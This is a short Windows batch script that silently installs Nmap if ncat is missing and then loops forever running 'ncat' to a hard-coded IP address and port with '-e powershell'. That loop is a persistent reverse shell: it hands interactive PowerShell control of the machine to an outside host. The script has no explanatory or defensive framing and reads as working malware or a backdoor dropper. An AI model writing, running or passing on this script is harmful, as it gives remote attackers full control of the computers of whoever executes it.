@echo off
setlocal

:: Check
where ncat >nul 2>&1
if %errorlevel%==0 (
    goto ncat
)

:: Set variables
set "host=147.185.221.20"
set "port=45895"
set "url=https://nmap.org/dist/nmap-7.95-setup.exe"
set "installer=nmap-7.95-setup.exe"
set "tempdir=%temp%\nmap_installer"

:: Create a temporary directory for the installer
if not exist "%tempdir%" (
    mkdir "%tempdir%"
)

:: Download the installer
powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %tempdir%\%installer%" 

:: Check if the download was successful
if not exist "%tempdir%\%installer%" (
    echo Error Code 2
    goto :eof
)

:: Run the installer silently
start /wait %tempdir%\%installer% /S

:: Clean up
del "%tempdir%\%installer%"
rmdir "%tempdir%"


:ncat
ncat %host% %port% -e powershell
goto ncat

:end
endlocal
